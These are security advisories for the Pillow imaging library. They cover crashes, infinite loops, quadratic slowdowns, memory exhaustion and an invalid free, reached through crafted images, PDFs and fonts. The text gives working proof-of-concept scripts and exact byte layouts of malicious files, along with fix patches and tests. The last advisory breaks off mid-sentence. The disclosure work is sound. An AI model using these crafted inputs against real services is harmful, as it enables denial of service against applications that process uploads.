summary: Pillow: NULL pointer dereference in Image.merge via an unvalidated band 0
details:
### Summary
`Image.merge()` checks the mode of every input band except band 0. If band 0 is a single-band `I` or `F` image, the native merge routine reads a pixel pointer that is NULL for those modes and the process crashes. The IPTC plugin reaches this from a plain `Image.open()` followed by a load, and IPTC has no magic-byte prefilter, so a crafted file with no recognizable header can drive it.

### Details
The validation loop skips band 0:

- `src/PIL/Image.py:3795` iterates `for band in bands[1:]` and checks mode and size only for those.

For an `I` or `F` image the 8-bit plane `image8` is NULL (only `image32` is set). `ImagingMerge` dereferences `bands[0]->image8[y]` for the multi-band output modes:

- `src/libImaging/Bands.c:302`, `:311`, `:321`

The IPTC loader builds the band list from an attacker-typed sub-image and passes it to merge with the sub-image at index 0:

- `src/PIL/IptcImagePlugin.py:156-160`
- `src/PIL/IptcImagePlugin.py:169` registers the opener with no accept function.

### PoC
```python
from PIL import Image

# Band 0 is a single-band "I" image: its image8 plane is NULL. merge() validates only
# bands[1:], so the native ImagingMerge dereferences the NULL plane for band 0.
band0 = Image.new("I", (4, 4))
Image.merge("RGB", [band0, Image.new("L", (4, 4)), Image.new("L", (4, 4))])
```

Run it:
```
$ python 02_poc.py
Segmentation fault (core dumped)
```

Observed on a source build of commit `3e2ab96`.

Under AddressSanitizer:
```
==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
    #0 ImagingMerge   src/libImaging/Bands.c:311
    #1 _merge         src/_imaging.c:2492
SUMMARY: AddressSanitizer: SEGV src/libImaging/Bands.c:311 in ImagingMerge
```
The null address confirms the dereference of the missing `image8` plane for band 0.

### Impact
NULL pointer dereference in a C extension. A crafted file opened and loaded through the IPTC path crashes the worker process. This is a hard crash, not a Python exception an application can catch.

summary: Pillow: Infinite loop in PdfParser.rewrite_pages on page tree Parent cycle
details:
``` ============================================================================ Infinite loop in PdfParser.rewrite_pages on page tree Parent cycle Location: src/PIL/PdfParser.py:505 in PdfParser.rewrite_pages() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A PDF file of a few hundred bytes makes Pillow hang forever, holding one processor core at 100%, when an application tries to append an image to it. Anyone who can supply the existing PDF to an application that calls `im.save(fp, "PDF", append=True)` (or `save_all=True, append=True`) can tie up that worker indefinitely. Memory use stays flat, so only an external timeout stops it. The bug is in `PdfParser.rewrite_pages()` in `src/PIL/PdfParser.py` (the `while pages_tree_node_ref:` loop at line 505). For each original page, it walks the `/Parent` chain upward and stops only when it reaches a node with no `/Parent`. It keeps no record of nodes it has already visited, so a loop in that chain never ends. The simplest case is a `/Pages` root that lists itself as its own `/Parent`; a longer cycle among page-tree nodes behaves the same way. The path is `PdfImagePlugin._save()` → `write_catalog()` → `rewrite_pages()`, and it is reached whether the save target is a file path or a `BytesIO`. Plain `Image.open()` pipelines are not affected, because Pillow only parses PDFs on the append path. This is a sibling of CVE-2026-42310 (the cyclic trailer `/Prev` loop in the same parser). The `processed_offsets` guard added to `read_prev_trailer()` for that issue does not cover this walk. The loop was introduced in 24ecfe315ab5 (2018-03-03) and has been present in every release since 5.1.0. The attached reproducer builds two in-memory PDFs and appends a 4×4 image to each. The normal file finishes in about 45 ms. The 333-byte self-parented file is still spinning inside `rewrite_pages()` when a 5-second watchdog interrupts it. Two alternative fixes are attached: one silently tolerates the cycle, and one rejects the file with an error. ## Details `PdfParser.rewrite_pages()` walks the `/Parent` chain of every pre-existing page upward and stops only when a node has no `/Parent`. It keeps no record of visited nodes, so a page-tree node whose `/Parent` points at itself, or at any node below it, makes the walk spin forever. The following 333-byte file is a valid one-page PDF except that object 2, the page-tree root, declares `/Parent 2 0 R`: ``` %PDF-1.4 1 0 obj <> endobj 2 0 obj <> endobj 3 0 obj <> endobj xref 0 4 0000000000 65535 f 0000000009 00000 n 0000000056 00000 n 0000000125 00000 n trailer <> startxref 192 %%EOF ``` `Image.new("RGB", (4, 4)).save(io.BytesIO(pdf), "PDF", append=True)` on these bytes never returns and holds one core at 100 % (the same happens when the target is a file path opened `r+b`). Interrupting it with `SIGALRM` after 5 s gives this traceback every time: ``` File "src/PIL/PdfImagePlugin.py", line 263, in _save existing_pdf.write_catalog() File "src/PIL/PdfParser.py", line 473, in write_catalog self.rewrite_pages() File "src/PIL/PdfParser.py", line 505, in rewrite_pages while pages_tree_node_ref: ``` The same file without `/Parent 2 0 R` on object 2 is appended to in ~30 ms. The loop: ```python # src/PIL/PdfParser.py:483-510 def rewrite_pages(self) -> None: pages_tree_nodes_to_delete = [] for i, page_ref in enumerate(self.orig_pages): page_info = self.cached_objects[page_ref] del self.xref_table[page_ref.object_id] pages_tree_nodes_to_delete.append(page_info[PdfName(b"Parent")]) … # delete redundant Pages tree nodes from xref table for pages_tree_node_ref in pages_tree_nodes_to_delete: while pages_tree_node_ref: pages_tree_node = self.cached_objects[pages_tree_node_ref] if pages_tree_node_ref.object_id in self.xref_table: del self.xref_table[pages_tree_node_ref.object_id] pages_tree_node_ref = pages_tree_node.get(b"Parent", None) self.orig_pages = [] ``` How the input gets there: with `append=True`, `PdfImagePlugin._save()` opens the existing bytes with `PdfParser.PdfParser(f=fp, …, mode="r+b")` (`src/PIL/PdfImagePlugin.py:199`), whose constructor calls `read_pdf_info()`. That reads the catalog, reads the page-tree root through `read_indirect()` — which stores every object it reads in `self.cached_objects` (`src/PIL/PdfParser.py:1077`) — and flattens the tree with `linearize_page_tree()`, which `read_indirect()`s every `/Kids` entry. So after parsing, `orig_pages == [3 0 R]` and objects 2 and 3 are both in `cached_objects`. `_save()` then calls `existing_pdf.write_catalog()` → `rewrite_pages()`. For the file above, the first loop puts page 3's `/Parent`, `2 0 R`, into `pages_tree_nodes_to_delete`. The inner `while` looks object 2 up in `cached_objects`, removes it from the xref table on the first pass, and sets `pages_tree_node_ref` to object 2's `/Parent` — which is `2 0 R` again. Nothing in the loop body changes on subsequent iterations, so it never exits: `cached_objects[2 0 R]` is never evicted, and deleting an already-deleted id from `XrefTable` is silent — `__delitem__` only records the id in `deleted_entries`, while `__contains__` keeps answering from `existing_entries`. The loop performs no I/O and no allocation, so neither `MemoryError` nor the recursion limit intervenes. A longer cycle behaves identically as long as every node on it was reached through `linearize_page_tree()` and is therefore cached (e.g. root 2 → `/Kids [4 0 R]`, node 4 → `/Kids [3 0 R] /Parent 2 0 R`, and root 2 declaring `/Parent 4 0 R`); a `/Parent` pointing at an object that was never read raises `KeyError` instead, which is harmless. The parser already defends against exactly this shape of problem one level up: `read_prev_trailer()` (`src/PIL/PdfParser.py:699-722`) carries a `processed_offsets` list and raises `PdfFormatError("trailer loop found")` when a `/Prev` offset repeats — the fix for CVE-2026-42310. The `/Parent` walk in `rewrite_pages()` has no equivalent guard. The unguarded walk was introduced in `24ecfe315ab5` ("issue #2959: fix wrong Parent of pre-existing Page objects when appending", 2018-03-03) and has been in every release since 5.1.0. ## Impact Any application that appends pages to a PDF it did not produce — `im.save(fp, "PDF", append=True)` or `save_all=True, append=True` on a user-supplied document — hangs indefinitely with one CPU core pinned, on an input of a few hundred bytes. The loop is pure Python doing two dict lookups per iteration, so memory stays flat and memory limits do not end it; only an external watchdog does. In a web worker or batch converter that is a denial of service of that worker per request. The attacker needs to control only the bytes of the existing PDF; no non-default Pillow setting is involved beyond the application choosing the append path. Pillow does not open PDFs for reading, so plain `Image.open()` pipelines are not affected. This is a sibling of CVE-2026-42310 (infinite loop on a cyclic trailer `/Prev` chain in the same parser, same entry point): same class, different linked structure, and the guard added for that CVE does not cover it. ## Reproducing `repro` is a single Python script that runs against the installed Pillow (`/src/src/PIL`). It needs no build step and no companion files, and takes about 5 seconds. The script builds two one-page PDFs in memory with `make_pdf()`. Each has a Catalog (object 1), a `/Pages` root (object 2) and a `/Page` (object 3), and each has a correct xref table. The only difference between them is in object 2: - `control` has `<>`. This is a normal file. - `cyclic` has `<>`, so the page-tree root names itself as its own `/Parent`. This is the 333-byte file shown above. For each PDF the script prints the bytes and then calls `Image.new("RGB", (4, 4)).save(io.BytesIO(pdf), "PDF", append=True)` under a 5-second `SIGALRM` watchdog. If the watchdog fires, the script prints the Pillow frames the append was running in. The control runs first and has to finish. If it doesn't, the environment is broken, so the script prints `OK` without giving a verdict. Expected output on this commit (PDF dumps omitted): ``` [control] append finished in 0.045s [cyclic] still running after 5s, interrupted in: save() /src/src/PIL/Image.py:2724 save_handler(self, fp, filename) _save() /src/src/PIL/PdfImagePlugin.py:263 existing_pdf.write_catalog() write_catalog() /src/src/PIL/PdfParser.py:473 self.rewrite_pages() rewrite_pages() /src/src/PIL/PdfParser.py:506 pages_tree_node = self.cached_objects[pages_tree_node_ref] ... BUG ``` The innermost one or two frames change from run to run, because the alarm can land anywhere in the loop body at lines 505–509. The `rewrite_pages()` frame is always there. The control's timing shows that the same file without the self-reference is appended to in milliseconds. A fixed parser either finishes the cyclic append just as fast or rejects the file with an exception. In both cases the script prints `OK`. With attached patch 1 applied it prints `[cyclic] append finished in 0.001s` and `OK`. With attached patch 2 it prints `[cyclic] raised PdfFormatError: page tree loop found` and `OK`. The last line is `BUG` only when the cyclic append is still running when the watchdog fires. ## Suggested fix Both attached patches fix the root cause, which is that the `/Parent` walk in `rewrite_pages()` keeps no record of the nodes it has visited. Either one can be merged; they differ only in what happens to a malformed file. **Attached patch 1** (tolerant; our preference) adds one `processed_pages_tree_nodes` set that is shared across all pages in the delete loop, and breaks out of the `while` as soon as it reaches a node it has already seen: ```python # src/PIL/PdfParser.py, rewrite_pages() processed_pages_tree_nodes: set[IndirectReference] = set() for pages_tree_node_ref in pages_tree_nodes_to_delete: while pages_tree_node_ref: if pages_tree_node_ref in processed_pages_tree_nodes: break processed_pages_tree_nodes.add(pages_tree_node_ref) … ``` Breaking loses nothing, because a visited node has already been removed from the xref table. The output is the same as today for every file that terminates. The file above is appended to normally, and object 2 ends up deleted. As a side effect, the ancestor chain that every page shares is walked once in total rather than once per page. **Attached patch 2** (strict) follows the `read_prev_trailer()` guard from the CVE-2026-42310 fix. It keeps a `processed_pages_tree_nodes` list for each page and calls `check_format_condition(pages_tree_node_ref not in processed_pages_tree_nodes, "page tree loop found")`, so a cyclic file is rejected with `PdfFormatError`. The list is per page because ancestors are legitimately shared between the pages of a well-formed document. Note that the error is raised from `write_catalog()`. By then the new page objects have already been written to the `r+b` file, but the new xref/trailer has not. Any other error raised on the append path today leaves the file in the same partially written state. Each patch also adds a `test_page_tree_parent_loop` regression test to `Tests/test_pdfparser.py`. The test builds the self-parented PDF above in memory, so no binary test asset is needed. No other `/Parent` walk exists in the parser, and `linearize_page_tree()` does not follow `/Parent`. Note that this walk follows `/Parent` links, which nothing else in `PdfParser` reads: `linearize_page_tree()` only follows `/Kids` downward and never looks at `/Parent`, so a visited-set added to the `/Kids` recursion (see Related findings) does not reach this loop. The file above has a perfectly tree-shaped `/Kids` structure and still hangs; both walks need their own guard, and they are natural to land together as one "validate page tree while appending" change. ## Related findings - **Exponential page tree expansion in `PdfParser.linearize_page_tree()` (repeated `/Kids` references) hangs PDF append** — the downward counterpart of this bug in the same parser and on the same `Image.save(..., "PDF", append=True)` entry point: `linearize_page_tree()` (`src/PIL/PdfParser.py:1080-1094`) recurses into every `/Kids` entry and re-parses it via `read_indirect()` with no visited set, so a `/Pages` chain whose nodes list the same child N times over D levels costs ND object parses (a 1.9 KB, 10-wide × 12-level file never returns; a 5.8 KB, 300-wide × 3-level file runs for 13 minutes; a direct `/Kids` cycle ends in `RecursionError`). It differs from this report in the link followed (`/Kids` down vs `/Parent` up), the function and phase (`linearize_page_tree()` during `read_pdf_info()` in the `PdfParser` constructor vs `rewrite_pages()` during `write_catalog()`), the introducing commit (`6207b44ab1ff` vs `24ecfe315ab5`), and the symptom (exponential but finite CPU vs a true infinite loop). It needs a separate hunk: the patches attached here only guard the `/Parent` walk and leave the `/Kids` reproducer hanging in `linearize_page_tree()`, and the `/Kids` guard conversely leaves this reproducer spinning in `rewrite_pages()` — verified by cross-applying each patch. Applied together (the `/Kids` guard plus attached patch 2), both reproducers are rejected with `PdfFormatError: page tree loop found` and `Tests/test_pdfparser.py` + `Tests/test_file_pdf.py` pass (30 tests). ## The patch (1 of 2) Track visited page-tree nodes in PdfParser.rewrite_pages() so a cyclic /Parent chain cannot loop forever when appending to a PDF Applies to `src/PIL/PdfParser.py` at the commit above. ```diff diff --git a/Tests/test_pdfparser.py b/Tests/test_pdfparser.py index f2ae6b11f..f841aca14 100644 --- a/Tests/test_pdfparser.py +++ b/Tests/test_pdfparser.py @@ -169,3 +169,28 @@ def test_duplicate_xref_entry() -> None: def test_trailer_loop() -> None: with pytest.raises(PdfFormatError, match="trailer loop found"): PdfParser("Tests/images/trailer_loop.pdf") + + +@pytest.mark.timeout(5) +def test_page_tree_parent_loop() -> None: + # the /Pages root names itself as its own /Parent + objects = [ + b"<>", + b"<>", + b"<>", + ] + b = BytesIO(b"%PDF-1.4\n") + offsets = [] + for object_id, body in enumerate(objects, start=1): + offsets.append(b.tell()) + b.write(b"%d 0 obj\n%s\nendobj\n" % (object_id, body)) + xref_offset = b.tell() + b.write(b"xref\n0 4\n0000000000 65535 f \n") + b.write(b"".join(b"%010d 00000 n \n" % offset for offset in offsets)) + b.write(b"trailer\n<>\nstartxref\n%d\n%%%%EOF\n" % xref_offset) + + with PdfParser(f=b, mode="r+b") as pdf: + pdf.start_writing() + pdf.write_catalog() + pdf.write_xref_and_trailer() + assert 2 in pdf.xref_table.deleted_entries diff --git a/src/PIL/PdfParser.py b/src/PIL/PdfParser.py index 672557190..9260cd8e7 100644 --- a/src/PIL/PdfParser.py +++ b/src/PIL/PdfParser.py @@ -501,8 +501,14 @@ class PdfParser: # replace the page reference with the new one self.pages[j] = new_page_ref # delete redundant Pages tree nodes from xref table + processed_pages_tree_nodes: set[IndirectReference] = set() for pages_tree_node_ref in pages_tree_nodes_to_delete: while pages_tree_node_ref: + if pages_tree_node_ref in processed_pages_tree_nodes: + # ancestors are shared between pages, and a malformed + # /Parent chain may loop back on itself + break + processed_pages_tree_nodes.add(pages_tree_node_ref) pages_tree_node = self.cached_objects[pages_tree_node_ref] if pages_tree_node_ref.object_id in self.xref_table: del self.xref_table[pages_tree_node_ref.object_id] ``` ## The patch (2 of 2) Raise PdfFormatError("page tree loop found") in PdfParser.rewrite_pages() when a page's /Parent chain loops back on itself Applies to `src/PIL/PdfParser.py` at the commit above. ```diff diff --git a/Tests/test_pdfparser.py b/Tests/test_pdfparser.py index f2ae6b11f..24faeefbc 100644 --- a/Tests/test_pdfparser.py +++ b/Tests/test_pdfparser.py @@ -169,3 +169,27 @@ def test_duplicate_xref_entry() -> None: def test_trailer_loop() -> None: with pytest.raises(PdfFormatError, match="trailer loop found"): PdfParser("Tests/images/trailer_loop.pdf") + + +@pytest.mark.timeout(5) +def test_page_tree_parent_loop() -> None: + # the /Pages root names itself as its own /Parent + objects = [ + b"<>", + b"<>", + b"<>", + ] + b = BytesIO(b"%PDF-1.4\n") + offsets = [] + for object_id, body in enumerate(objects, start=1): + offsets.append(b.tell()) + b.write(b"%d 0 obj\n%s\nendobj\n" % (object_id, body)) + xref_offset = b.tell() + b.write(b"xref\n0 4\n0000000000 65535 f \n") + b.write(b"".join(b"%010d 00000 n \n" % offset for offset in offsets)) + b.write(b"trailer\n<>\nstartxref\n%d\n%%%%EOF\n" % xref_offset) + + with PdfParser(f=b, mode="r+b") as pdf: + pdf.start_writing() + with pytest.raises(PdfFormatError, match="page tree loop found"): + pdf.write_catalog() diff --git a/src/PIL/PdfParser.py b/src/PIL/PdfParser.py index 672557190..9021b8d63 100644 --- a/src/PIL/PdfParser.py +++ b/src/PIL/PdfParser.py @@ -502,7 +502,13 @@ class PdfParser: self.pages[j] = new_page_ref # delete redundant Pages tree nodes from xref table for pages_tree_node_ref in pages_tree_nodes_to_delete: + processed_pages_tree_nodes = [] while pages_tree_node_ref: + check_format_condition( + pages_tree_node_ref not in processed_pages_tree_nodes, + "page tree loop found", + ) + processed_pages_tree_nodes.append(pages_tree_node_ref) pages_tree_node = self.cached_objects[pages_tree_node_ref] if pages_tree_node_ref.object_id in self.xref_table: del self.xref_table[pages_tree_node_ref.object_id] ``` ## The reproducer
Reproducer — repro, 3,152 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 """Infinite loop in PdfParser.rewrite_pages() on a cyclic /Parent chain. Appending an image to an existing PDF (im.save(fp, "PDF", append=True)) makes rewrite_pages() walk each original page's /Parent chain upward until a node has no /Parent. Nothing records which nodes were visited, so a /Pages node that names itself as its own /Parent keeps the walk going forever. We append a 4x4 image to two one-page PDFs that differ in one entry: control - a normal PDF -> finishes in milliseconds cyclic - the /Pages root also says /Parent 2 0 R -> never finishes A SIGALRM watchdog interrupts the append and shows the line it was stuck on. """ import io import signal import time import traceback from PIL import Image WATCHDOG_S = 5 def make_pdf(pages_root): """Catalog (1) -> /Pages root (2) -> /Page (3), with a correct xref table.""" objects = [ b"<>", pages_root, b"<>", ] pdf = bytearray(b"%PDF-1.4\n") offsets = [] for num, body in enumerate(objects, start=1): offsets.append(len(pdf)) pdf += b"%d 0 obj\n%s\nendobj\n" % (num, body) xref_offset = len(pdf) pdf += b"xref\n0 4\n0000000000 65535 f \n" pdf += b"".join(b"%010d 00000 n \n" % off for off in offsets) pdf += b"trailer\n<>\nstartxref\n%d\n%%%%EOF\n" % xref_offset return bytes(pdf) class StillRunning(BaseException): pass def on_alarm(signum, frame): raise StillRunning def append_image(name, pdf): """Append an image to `pdf`; return True if it finished before the watchdog.""" print(f"--- {name}: {len(pdf)}-byte PDF ---") print(pdf.decode("latin-1"), end="") signal.alarm(WATCHDOG_S) start = time.monotonic() try: Image.new("RGB", (4, 4)).save(io.BytesIO(pdf), "PDF", append=True) except StillRunning as e: print(f"[{name}] still running after {WATCHDOG_S}s, interrupted in:") for frame in traceback.extract_tb(e.__traceback__): if "/PIL/" in frame.filename: print(f" {frame.name}() {frame.filename}:{frame.lineno} {frame.line}") return False except Exception as e: # rejecting the file is a correct, safe outcome print(f"[{name}] raised {type(e).__name__}: {e}") return True finally: signal.alarm(0) print(f"[{name}] append finished in {time.monotonic() - start:.3f}s") return True signal.signal(signal.SIGALRM, on_alarm) # Set up: the well-formed file is appended to instantly. control = make_pdf(b"<>") if not append_image("control", control): print("control case did not finish; environment problem, no verdict") print("OK") raise SystemExit # Attack: the same file, except the /Pages root is its own /Parent. cyclic = make_pdf(b"<>") finished = append_image("cyclic", cyclic) # Verify: a fixed parser finishes (or rejects the file) like the control. print("BUG" if not finished else "OK") ```

summary: Pillow: Quadratic GIF comment copying during save
details: On Pillow 12.3.0 and upstream `main` (`ad277e2761b489681e71b51e91367d46b0ceabb9`), a GIF with a long comment makes `_get_global_header()` copy portions of the comment repeatedly when saving, including comments carried over from untrusted images. I suggest provisional **Moderate** severity for crafted-image CPU denial of service, with CVSS-B 6.9 assuming a network service automatically opens unauthenticated uploads and they are resaved as GIFs; impact depends on input-size, concurrency, and worker CPU limits.

summary: Pillow: MSP RLE decoder expands a tiny file into unbounded memory
details:
### Summary
The MSP RLE decoder expands run-length data into an in-memory buffer with no cap tied to the declared image size. A small file that passes the pixel-count check can force hundreds of megabytes or more of allocation when the application loads pixels.

### Details
The MSP decoder writes each run into an unbounded `io.BytesIO` and can expand roughly 85x per run:

- `src/PIL/MspImagePlugin.py:144-146`

### Impact
Memory-exhaustion denial of service from a tiny crafted image in any application that loads pixels. The expansion is decoupled from the declared pixel count, so `MAX_IMAGE_PIXELS` does not bound it.

summary: Pillow: Invalid free in FreeType glyph rendering when a stroker is active
details:
### Summary
When text is drawn with a non-zero stroke width, Pillow creates a FreeType stroker and then loads each glyph. If `FT_Load_Glyph` fails for a glyph, the cleanup path calls `FT_Done_Glyph` on the `glyph` variable. That variable is not initialized before the first measurement loop, and in the render loop it is not reset to NULL after each glyph is freed. A malformed font loaded from untrusted bytes can force the load error and reach this free. This is a latent memory-safety defect; whether it crashes depends on the value in the uninitialized or stale pointer.

### Details
`glyph` is declared without a NULL initializer:

- `src/_imagingft.c:848`

The first measurement loop can jump to `glyph_error` before `glyph` is ever assigned:

- `src/_imagingft.c:1010-1013`

In the render loop the glyph is freed at the end of each iteration and not set back to NULL:

- `src/_imagingft.c:1242`

The cleanup frees it whenever a stroker exists:

- `src/_imagingft.c:1253-1256`

`ImageFont.truetype` accepts a file object or bytes, so the font is attacker-suppliable.

### PoC
This needs `fontTools` and any base TTF (the example uses one bundled with Pillow's tests). It rewrites glyph "A" to claim 5000 contours in a glyph body far too short for them, so `FT_Load_Glyph` returns an error while the face still opens.

```python
import struct
from fontTools.ttLib import TTFont
from PIL import Image, ImageFont, ImageDraw

SRC = "Tests/fonts/FreeMono.ttf"          # any TTF works as a base
tt = TTFont(SRC)
gid = tt.getGlyphID(tt.getBestCmap()[ord("A")])
loca_long = tt["head"].indexToLocFormat
tt.close()

raw = bytearray(open(SRC, "rb").read())
nt = struct.unpack(">H", raw[4:6])[0]
tbl = {}
for i in range(nt):
    rec = 12 + i * 16
    tag = bytes(raw[rec:rec+4]).decode("latin-1")
    off, length = struct.unpack(">II", raw[rec+8:rec+16])
    tbl[tag] = (off, length)
glyf_off = tbl["glyf"][0]; loca_off = tbl["loca"][0]
if loca_long:
    o0 = struct.unpack_from(">I", raw, loca_off + 4*gid)[0]
else:
    o0 = struct.unpack_from(">H", raw, loca_off + 2*gid)[0] * 2
struct.pack_into(">h", raw, glyf_off + o0, 5000)   # numberOfContours = 5000
open("evil.ttf", "wb").write(raw)

f = ImageFont.truetype("evil.ttf", 20)             # face opens
d = ImageDraw.Draw(Image.new("RGB", (64, 64)))
d.text((0, 0), "A", font=f, stroke_width=2)        # load error -> FT_Done_Glyph on bad pointer
```

Result on the pinned build: `FT_Load_Glyph` returns an error and execution reaches the `glyph_error` cleanup that calls `FT_Done_Glyph(glyph)` (the plugin surfaces `OSError: invalid outline`).

### Impact
Applications that draw text with `stroke_width != 0` using fonts loaded from untrusted bytes can hit an invalid or double free. The correct fix is small: initialize `glyph = NULL` and set it back to NULL after each `FT_Done_Glyph`.

summary: Pillow: Quadratic-time DoS in PDF save_all (PdfParser.next_object_id)
details:
``` ============================================================================ Quadratic-time DoS in PDF save_all (PdfParser.next_object_id) Location: src/PIL/PdfParser.py:629 in next_object_id() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` Pillow's PDF writer takes time proportional to the square of the number of frames when it saves a multi-frame image as a multi-page PDF. Anyone who can get an application to convert their uploaded image this way can tie up a worker at full CPU for minutes with a small file. A 240 KB animated image takes about 70 seconds, a 720 KB one an estimated 10 minutes, and a 125-byte animated PNG that merely *declares* a large frame count triggers the same slowdown with no upper bound short of 2³¹ frames. Memory stays under 100 MB and the decompression-bomb limit never applies. The cause is `PdfParser.next_object_id()` in `src/PIL/PdfParser.py`, which finds the next free id by computing `max(self.xref_table.keys())`. `XrefTable.keys()` rebuilds three sets over every id reserved so far on each call. `PdfImagePlugin._save()` calls it three times (four for palette images with transparency) per frame, for `n_frames` frames, before any page is written. That makes the id-reservation loop alone O(N²). Because `n_frames` is taken from the file before any frame is seeked, APNG's `acTL` count drives the loop even when the frames don't exist. In that case the save raises `OSError` only after the full delay. The precondition is that the application calls `im.save(..., "PDF", save_all=True)` on the attacker's file; `Image.open()` and `load()` alone do not reach this code. The attached reproducer shows 4× the frames costing about 11× the CPU for a valid GIF and about 16× for a fixed 125-byte APNG. The behaviour was introduced in `6207b44ab1ff` (2018-01-18) and first shipped in Pillow 5.1.0. A small patch that tracks the highest id in `XrefTable` makes the save linear. ## Details Saving a multi-frame image as a multi-page PDF (`im.save(fp, "PDF", save_all=True)`) costs CPU time proportional to the square of the frame count, independent of pixel content, because every object id the PDF writer reserves is found by rebuilding and scanning the set of all ids reserved so far. A 1×1-pixel animated GIF made of N identical 15-byte frames (built by the reproducer) gives, on a 2-CPU container with the stock build at this commit (absolute timings vary by machine; the growth rate does not): | frames | GIF size | `im.save(BytesIO(), "PDF", save_all=True)` | peak RSS | |---|---|---|---| | 2 000 | 30 KB | 1.1 s | | | 8 000 | 120 KB | 14.7 s | | | 16 000 | 240 KB | 70 s | 60 MB | | 32 000 | 480 KB | 262 s | 95 MB | | 48 000 | 720 KB | still running at 120 s (extrapolated ≈ 10 min) | | Each doubling of the input roughly quadruples the time. `cProfile` of the 8 000-frame save attributes 13.5 s of 17.6 s to 24 003 calls of `PdfParser.next_object_id` (8.9 s inside `XrefTable.keys`, 3.9 s inside `max`); encoding and writing the 8 000 pages is the remaining ~4 s and scales linearly. The per-page id reservation loop runs before any page is written: ```python # src/PIL/PdfImagePlugin.py:247-259 (_save) for im in ims: im_number_of_pages = 1 if save_all: im_number_of_pages = getattr(im, "n_frames", 1) … for i in range(im_number_of_pages): image_refs.append(existing_pdf.next_object_id(0)) if im.mode == "P" and "transparency" in im.info: image_refs.append(existing_pdf.next_object_id(0)) page_refs.append(existing_pdf.next_object_id(0)) contents_refs.append(existing_pdf.next_object_id(0)) ``` `n_frames` comes straight from the file (for GIF it is the number of image blocks; the GIF plugin counts them by walking block headers, which is cheap). The frames do not even have to exist: the loop runs on `n_frames` before any frame is seeked, and for APNG `n_frames` is the `num_frames` value declared in the `acTL` chunk, rejected only if it is 0 or above `0x80000000` (`src/PIL/PngImagePlugin.py:716-720`). A 125-byte APNG declaring 8 000 frames therefore costs the same ~10–13 s as the 120 KB GIF, and more without bound as the declared count grows. Each of the 3 (or 4, for `P` images with transparency) calls per frame lands here: ```python # src/PIL/PdfParser.py:626-634 def next_object_id(self, offset: int | None = None) -> IndirectReference: try: # TODO: support reuse of deleted objects reference = IndirectReference(max(self.xref_table.keys()) + 1, 0) except ValueError: reference = IndirectReference(1, 0) if offset is not None: self.xref_table[reference.object_id] = (offset, 0) return reference # src/PIL/PdfParser.py:175-178 (XrefTable) def keys(self) -> set[int]: return ( set(self.existing_entries.keys()) - set(self.deleted_entries.keys()) ) | set(self.new_entries.keys()) ``` `_save` passes `offset=0`, so every reserved id is inserted into `xref_table.new_entries`. The k-th call therefore materialises three sets covering all k−1 previous ids, computes a difference and a union, and then `max()` scans the result — O(k) work to produce the integer k. Summed over 3N calls this is O(N²): for 48 000 frames, 144 002 calls over sets growing to 144 002 elements, on the order of 10¹⁰ set-element operations, all spent before `_write_image` is reached for the first frame. Nothing on this path consults `MAX_IMAGE_PIXELS` (the frames are 1×1) and nothing raises; for the GIF the save eventually completes and produces a valid PDF, and for the declared-only APNG it raises `OSError` only once the id loop has finished and the first missing frame is seeked. This reservation scheme was introduced in `6207b44ab1ff` ("issue #2959: support appending to existing PDFs", 2018-01-18) and first shipped in Pillow 5.1.0; before it, the writer numbered objects arithmetically. For contrast, `write_obj(ref, …)` with an already-reserved `ref` (`src/PIL/PdfParser.py:548-555`) only does a dict store, which is why the page-writing phase that follows is linear; the super-linear cost is entirely in how the next free id is computed. ## Impact The precondition is that the application saves the attacker's image as PDF with `save_all=True`; `Image.open()` and `load()` alone do not reach this code. An application that converts uploaded images to PDF this way — the documented way to get one page per frame from animated GIF/APNG/WebP or multi-page TIFF input — can have a worker held at 100 % CPU for about 10 minutes by a 720 KB GIF, about 4½ minutes by a 480 KB one, with the cost continuing to grow quadratically with upload size. With APNG the file size does not matter at all: a 125-byte file declaring N frames in `acTL` drives the same quadratic loop, up to the 2³¹ cap. The attacker controls only the file bytes; no unusual dimensions, modes or options are needed, memory use stays under 100 MB so memory limits do not intervene, and the decompression-bomb guard is not applicable. The consequence is denial of service of the process performing the conversion. Single-image PDF saves, and `save_all` saves of images with tens or hundreds of frames, are unaffected in practice. This is the same family as earlier accidentally-quadratic parsing issues fixed in Pillow (e.g. CVE-2021-28677, EPS `readline`), but on the PDF *writer* side, reached only through a save rather than on open, and driven by frame count rather than by line structure. ## Reproducing `repro` is a single Python script. Run it with the Python that has Pillow installed (`./repro`). It uses under 100 MB of RAM and writes no files. **Input.** Two kinds of file are built in memory, each with 2 000 and 8 000 frames: - `gif(n)`: a valid animated GIF — a `GIF89a` header with a 1×1 logical screen and a 2-colour global palette, then `n` copies of one 15-byte frame (a 1×1 image descriptor plus the LZW data for one pixel), then the trailer (30 and 120 KB). The only unusual thing about it is how many frames it has. - `apng(n)`: a 125-byte APNG — a 1×1 greyscale `IHDR`, an `acTL` chunk declaring `n` frames, one `fcTL`, one `IDAT` and `IEND`. Only the first frame exists; the other `n − 1` are merely declared. **Action.** Each file goes through what an upload-to-PDF converter would do: `Image.open(BytesIO(data))`, then `im.save(BytesIO(), "PDF", save_all=True)`, timed with `time.process_time()`. For the APNG the save raises `OSError` once the writer tries to seek to the second frame; that happens after the id-reservation loop has run for all `n` declared frames, so the exception is caught and the CPU time up to it is recorded. **Expected output** (stock build at this commit): ``` GIF frames= 2000 file= 30020 B save CPU= 1.03s result=ok GIF frames= 8000 file=120020 B save CPU= 11.68s result=ok GIF: 4x frames -> 11.3x CPU (linear ~4x, quadratic ~16x) APNG frames= 2000 file= 125 B save CPU= 0.65s result=OSError(Truncated File Read) APNG frames= 8000 file= 125 B save CPU= 10.48s result=OSError(Truncated File Read) APNG: 4x frames -> 16.1x CPU (linear ~4x, quadratic ~16x) BUG ``` A linear save would take about 4× as long for 4× the frames; here the GIF save grows ~11× and the APNG save ~16×, the latter with the file size fixed at 125 bytes. The script prints `BUG` when the save CPU for either format grows at least 8× for 4× the frames (twice the linear expectation), otherwise `OK`. Extending the same curve gives the figures in the table above: about 70 s at 16 000 frames (240 KB GIF), and about 10 minutes for a 720 KB file. With the attached patch applied, the GIF save takes 0.32 s / 1.20 s (3.7×) and the APNG save 0.01 s / 0.03 s, and the script prints `OK`. ## Suggested fix Make `next_object_id()` O(1) by tracking the highest object id 